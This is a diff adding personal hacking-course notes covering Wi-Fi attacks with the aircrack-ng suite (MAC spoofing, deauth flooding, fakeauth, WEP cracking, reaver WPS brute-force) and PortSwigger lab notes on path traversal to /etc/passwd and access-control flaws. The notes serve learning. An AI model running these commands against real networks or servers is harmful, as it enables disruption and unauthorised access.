@@ -1,0 +1,157 @@
+7:10 PM 5/26/2025
+بسم الله نبدأ تعلم جديد
+----------------------------------------------------------------------------------------------
+aircrack-ng filename.cap
+ifconfig wlan0 down 
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+ifconfig wlan0 down
+airmon-ng check kill
+iwconfig wlan0 mode monitor
+airodump-ng wlan0
+aireplay-ng --deauth 100000000 -a FC:D7:33:49:D4:A4 -c 0a:47:dd:10:35:07 wlan0
+airodump-ng --bssid FC:D7:33:49:D4:A4 --channel 7 --write /home/m/Desktop/test wlan0 
+iwconfig wlan0 channel 9
+aireplay-ng --fakeauth 30 -a FC:D7:33:49:D4:A4 -h 00:11:22:33:44:23 wlan0
+
+
+
+
+----------------------------------------------------------------------------------------------
+4. Network Hacking
+----------------------------------------------------------------------------------------------
+
+to change the mac address for a wifi chip (or any othrt chip i think)
+the mac address can help to be someone else like another device and gain internet access
+if the chip named wlan0, do this:
+ifconfig wlan0 down ; turn it off
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+DONE
+the mac will reset to original after restart (there is a fix for it)
+
+----------------------------------------------------------------------------------------------
+5. Network Hacking - Pre Connection Attacks
+----------------------------------------------------------------------------------------------
+to see the mode of the wifi chip write "iwconfig"
+if the mode Managed, means it will capture only data sent to this device
+change the mode to receve any data that is not sent to you:
+*
+ifconfig wlan0 down
+airmon-ng check kill ; this will kill any network connection and we do not need them
+ifconfig wlan0 down ; down again
+iwconfig wlan0 mode monitor
+DONE
+
+-----------
+airodump-ng
+to gather info about wirlesses
+-----------
+aireplay-ng
+attackes
+--deauth
+--fakeauth
+--interactive
+--arpreplay
+--chopchop
+--fragment
+--caffe-latte
+--cfrag
+--migmode
+--testairodump-ng
+-----------
+
+is a tool to monitor (capture in moinitor mode) the networks around and capture the data been sent there
+and see the clients connected and so on
+to capture the wirless networks and see the working ones (search) do this:
+*
+airodump-ng wlan0
+
+to capture info about single network and save them to a file do this:
+airodump-ng --bssid FC:D7:33:49:D4:A4 --channel 7 --write /home/m/Desktop/test wlan0 
+this will capture for a mac address and a channel that this network works on
+and save the data in a files 
+*
+this will show us also the devices connected to this network (macaddress)
+one of the files that been created named (*.cap) it catured all of the requests Encrypted
+and saved it in a file be opend using wireshark
+include the data been sent and so on
+*
+there is an attack to Dissconnect any one you want
+change the mac address for your device and tell the router 
+that you wand to dissconnect and the device will dissconnect
+this is useful if you want to see the password that is being used from this device
+the tool used is "aireplay-ng":
+*Python tool to do it for all connected devices
+aireplay-ng --deauth 100000000 -a FC:D7:33:49:D4:A4 -c 0a:47:dd:10:35:07 wlan0
+
+the tool name ; attack name (deauthanticate) -a the router -c the client connected
+
+It worked!
+
+
+aireplay-ng -0 100000000 -a FC:D7:33:49:D4:A4  wlan0;
+this to attack all clients, did not work becaues of channel select error
+*to change used channel
+iwconfig wlan0 channel 9
+
+
+
+----------------------------------------------------------------------------------------------
+6. Network Hacking - Gaining Access (WEPWPAWPA2 Cracking)
+----------------------------------------------------------------------------------------------
+
+one of the old ways used in Encryption is WEP, this old way 
+and it's been cracked, 
+to do the password cracking, you need to capture a big amont of data sent from the router, about 100000 data
+and then save it to (*.cap) file,
+use aircrack-ng to get the key from this file BY "aircrack-ng filename.cap"
+it will return the key.
+if there is no enoght data been sent, let it send fake data by fake requests,
+by useing "aireplay-ng --fakeauth ", this will send fake auth requests,
+and we will have new data to ceack from
+
+the fakeauth make us connect to the network but not really, so that we can comunicate with it.
+to crack key let the router send arp data "--arpreplay" and so that you will capture lots of data to use it to extract the key.
+
+WPA/WPA2:
+if the router hav e a feature names "WPS" so we can use a list to crack the key
+by gussing the key from that list, the key is 8 digit key
+to check wps networks do this "wash --interface wlan0
+
+to do this get the mac of the router and do a fakeauth attack
+aireplay-ng --fakeauth 30 -a FC:D7:33:49:D4:A4 -h 00:11:22:33:44:23 wlan0
+and then let a tool named reaver do the guessing
+reaver --bssid FC:D7:33:49:D4:A4 --channel 2 --interface wlan0 -vvv --no-associate
+
+
+----------------
+to crack wpa/wpa2 the way now to capture the hanshake that bing made by the client
+and the router, so to capture it,
+----------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------
+
+portswigger Web Security Academy
+
+----------------------------------------------------------------------------------------------
+Server-side vulnerabilities 2 : File path traversal, simple case
+get into filesystem pathes of a server that displays images on the front
+steal the password of the admin from the server
+`
+GET /image?filename=../../../etc/passwd HTTP/2
+Host: 0abd00fe044648f9834c748a0084005a.web-security-academy.net
+`
+----------------------------------------------------------------------------------------------
+Server-side vulnerabilities 3 : Access control 
+it is all about a functions that onl;y the admin must have access to it
+we look for any thing we can make without being an admin, to see the admins urls look for "robots.txt"
+*look for admin pages in the HTML or JS or any.
+
+Parameter-based access control methods, is used in query params or cookies or local storage of the WEB to detrmine
+that are you admin or not, so dummy
+
+
+User ID controlled by request parameter, user account that is public have a data belong to this user, use this data
+with your personal cookies and session id to access the user data
